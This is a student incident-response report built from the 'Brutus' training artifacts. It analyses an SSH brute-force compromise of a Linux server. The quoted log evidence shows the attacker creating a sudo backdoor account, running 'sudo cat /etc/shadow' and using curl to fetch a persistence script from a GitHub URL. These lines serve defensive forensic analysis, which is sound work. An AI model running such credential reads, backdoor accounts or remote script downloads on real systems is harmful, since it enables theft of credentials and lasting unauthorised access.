# Cybersecurity Analysis Report: SSH Brute-Force Compromise of a Linux Server (Brutus)

> Training exercise. This report is written from the Hack The Box Sherlock "Brutus" artifacts (`auth.log`, `wtmp`). No real organization is involved. The technical walkthrough is in [README.md](README.md).

**Prepared For:** IT and Security Management (hypothetical stakeholder, portfolio exercise)  
**Prepared By:** Z1AD-Z, cybersecurity student  
**Date:** 2026-11-25  
**Incident Date:** 2024-03-06 (UTC)  
**Overall Risk / Severity:** Critical  

---

## 1. Executive Summary

An AWS-hosted Linux server was compromised on 2024-03-06 through an SSH brute-force attack against the `root` account, which accepted password logins from the internet. Within about three minutes of getting in, the attacker created a backdoor account with administrator (`sudo`) rights, read the password-hash file `/etc/shadow`, and downloaded an external script. The most urgent risks are full root-level control of the server, a persistent account that survives a `root` password change, and the exposure of every local account's password hash. The primary recommended actions are to remove the backdoor account, rotate all credentials, rebuild the server from a trusted image, and disable password-based `root` login over SSH.

---

## 2. Scope & Methodology

* **In-Scope Assets:** One Linux server on AWS (hostname `ip-172-31-35-28`), its SSH service on port 22, and the accounts `root`, `cyberjunkie` and the other usernames targeted in the attack.
* **Out-of-Scope Assets:** Any other system on the same network, network-level logs, disk and memory images, the content of the downloaded script, and the server configuration files (`sshd_config`, `sudoers`), which were not provided.
* **Analysis Window:** `auth.log` covers 2024-03-06 06:18:01 to 06:41:01 UTC. `wtmp` covers logins from 2024-01-25 to 2024-03-06, and its times are 5 hours behind UTC.
* **Methods & Tools:** Manual log review with `cat` and `grep`, extraction of `wtmp` records with the provided `utmp.py` script and `strings`, correlation of the two sources after correcting the time zone offset, and a lookup of the persistence technique on the MITRE ATT&CK website. Only the two supplied files were available, so no live system, vulnerability scan or SIEM was used.

---

## 3. Key Findings & Technical Analysis

### Finding 1: Root account reachable over SSH with a password, brute-forced successfully

* **Severity:** Critical
* **Affected Assets:** SSH service (port 22), account `root`
* **Root Cause:** The server accepts password authentication for `root` from the internet. The same login method is used normally by the administrator (`Accepted password for root from 203.101.190.9` at 06:19:54), so it is a standing configuration and not a one-time exception. The logs show no lockout or per-source blocking: one source address tried five usernames in about 13 seconds and found the root password. The configuration file itself was not provided, so this is inferred from the logs.
* **Evidence / Timeline:**

  ```text
  06:31:31  Invalid user admin from 65.2.161.68 port 46380
  06:31:33  Failed password for backup from 65.2.161.68 port 46512 ssh2
  06:31:37  Failed password for invalid user server_adm from 65.2.161.68 port 46596 ssh2
  06:31:38  Failed password for invalid user svc_account from 65.2.161.68 port 46722 ssh2
  06:31:39  Failed password for root from 65.2.161.68 port 46852 ssh2
  06:31:40  Accepted password for root from 65.2.161.68 port 34782 ssh2   (session 34, closed the same second)
  06:32:44  Accepted password for root from 65.2.161.68 port 53184 ssh2   (session 37, manual login)
  ```

  The server logged `beginning MaxStartups throttling` at 06:31:31 and `exited MaxStartups throttling ... 21 connections dropped` at 06:32:39, which shows many simultaneous connections, consistent with an automated tool. The first successful login lasted under one second (a tool confirming the password). The second login, 64 seconds later, was an interactive session of 279 seconds (06:32:45 to 06:37:24 UTC).
* **Impact:** Full administrator access to the server: any data or service on it can be read, changed or destroyed.
* **Remediation:** Disable direct root login over SSH and password authentication, and use key-based logins for named administrator accounts. Limit which source addresses can reach port 22 (for example with the cloud security group). Add automatic blocking of sources with repeated failed logins. Verification: run `sshd -T | grep -iE "permitrootlogin|passwordauthentication"` and confirm both show `no`, then confirm a password login as root from a test machine is refused.

### Finding 2: Backdoor account with administrator rights created for persistence

* **Severity:** High
* **Affected Assets:** New local account `cyberjunkie` (UID 1002, home `/home/cyberjunkie`, shell `/bin/bash`), the `sudo` group
* **Root Cause:** Once the attacker had a root shell, nothing prevented creating accounts and changing group membership. This is the persistence technique **T1136.001, Create Account: Local Account** (MITRE ATT&CK, tactic: Persistence).
* **Evidence / Timeline:**

  ```text
  06:34:18  useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, ... from=/dev/pts/1
  06:34:26  passwd[2603]: password changed for cyberjunkie
  06:34:31  chfn[2605]: changed user 'cyberjunkie' information
  06:35:15  usermod[2628]: add 'cyberjunkie' to group 'sudo'
  06:37:24  root session (session 37) closed
  06:37:34  Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2   (session 49)
  ```

  The account was created from `/dev/pts/1`, the attacker's own session, and used ten seconds after that session ended.
* **Impact:** The attacker keeps administrator access even if the `root` password is changed, because `cyberjunkie` can use `sudo`.
* **Remediation:** Lock and remove the account and its home directory, review all other accounts and group memberships, and check whether other persistence exists (SSH keys in `authorized_keys`, scheduled jobs, new services). Verification: `getent passwd cyberjunkie` returns nothing, `getent group sudo` lists only the expected administrators, and `/etc/passwd` and `/etc/group` match a known-good copy.

### Finding 3: Credential file read and external script downloaded with administrator rights

* **Severity:** High
* **Affected Assets:** `/etc/shadow` (password hashes of all local accounts), the server's outbound internet access
* **Root Cause:** The backdoor account had `sudo` rights (Finding 2), and the server was allowed to download from the internet.
* **Evidence / Timeline:**

  ```text
  06:37:57  sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
  06:39:38  sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
  ```

  The log records the commands only. The downloaded script is not in the artifacts, and the `auth.log` provided ends at 06:41:01, so what happened afterwards is unknown.
* **Impact:** The password hashes of every local account must be treated as exposed, since they can be cracked offline. An unknown script was fetched with root privileges, so further changes to the system cannot be excluded.
* **Remediation:** Treat the whole server as compromised and rebuild it from a trusted image rather than cleaning it. Reset every password and key that was used on or stored on it. Retrieve and analyze the downloaded script if it is still available on disk. Consider restricting outbound traffic from the server to what it needs. Verification: after the rebuild, confirm no unexpected accounts, keys or scheduled tasks exist, and review logs from the new server for repeat attempts from the same source.

---

## 4. Containment & Immediate Actions Taken

* **Actions taken:** None. This report is a post-incident analysis of two log files from a training scenario, with no access to the live system.
* **Recommended immediate containment (not performed):**
  * Block `65.2.161.68` at the cloud firewall or security group, as a short-term measure. This does not stop the attacker from using another address.
  * Isolate the server from the network while keeping it powered on, to preserve evidence.
  * Lock the `root` and `cyberjunkie` accounts and end any open sessions.
  * Take a disk snapshot before any change, for later investigation.

---

## 5. Prioritized Remediation Roadmap

| Priority | Action Item | Target Owner | Target Timeline |
| :--- | :--- | :--- | :--- |
| **P1 (Immediate)** | Isolate the server, block `65.2.161.68`, lock `root` and `cyberjunkie`, take a disk snapshot | System administrator | 24 hours |
| **P1 (Immediate)** | Rebuild the server from a trusted image, rotate all passwords and keys that were on it | System administrator | 24–72 hours |
| **P2 (Short-Term)** | Disable root and password logins over SSH, use key-based authentication for named admin accounts | System administrator | 1–2 weeks |
| **P2 (Short-Term)** | Restrict SSH to known source addresses and add automatic blocking of repeated failed logins | System administrator | 1–2 weeks |
| **P3 (Long-Term)** | Send authentication logs to a separate log server and alert on new accounts, `sudo` group changes and logins from unknown addresses | Security team | 30–90 days |
| **P3 (Long-Term)** | Review and restrict outbound internet access from servers | Security team | 30–90 days |

---

## 6. Appendices

### Appendix A: Indicators of Compromise (IOCs) and Log Extracts

| Type | Value | Context |
| :--- | :--- | :--- |
| Source IP address | `65.2.161.68` | Brute force, both root sessions, and the `cyberjunkie` login |
| Targeted usernames | `admin`, `backup`, `server_adm`, `svc_account`, `root` | Brute-force attempts from 06:31:31 |
| Created account | `cyberjunkie` (UID 1002), member of `sudo` | Persistence |
| Session numbers | 34 (automated, 06:31:40), 37 (manual, 06:32:44), 49 (`cyberjunkie`, 06:37:34) | `systemd-logind` |
| URL | `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | Downloaded with `sudo curl` at 06:39:38 |
| File accessed | `/etc/shadow` | Read with `sudo cat` at 06:37:57 |
| Known-good address | `203.101.190.9` | Administrator root login at 06:19:54 (assumed legitimate from its history in `wtmp`, not proven) |

Time zone note: the times above are UTC from `auth.log`. `wtmp` rows are 5 hours behind (for example 01:32:45 in `wtmp` is 06:32:45 UTC).

### Appendix B: Attack Flow

```text
 65.2.161.68                         Linux server (ip-172-31-35-28)
      |
      |  06:31:31  many parallel SSH logins (admin, backup, server_adm,
      |            svc_account, root) -------------------------------->  sshd (port 22)
      |
      |  06:31:40  valid root password found, session 34 closed at once
      |
      |  06:32:44  manual root login (session 37) ------------------->  root shell
      |                                                                      |
      |                                       06:34:18  useradd cyberjunkie  |
      |                                       06:34:26  password set         |
      |                                       06:35:15  added to sudo        |
      |  06:37:24  root session closes <-------------------------------------+
      |
      |  06:37:34  login as cyberjunkie (session 49) ---------------->  user shell
      |                                                                      |
      |                                       06:37:57  sudo cat /etc/shadow |
      |                                       06:39:38  sudo curl linper.sh  |
      |                                                                      v
      |                                              log ends at 06:41:01, outcome unknown
```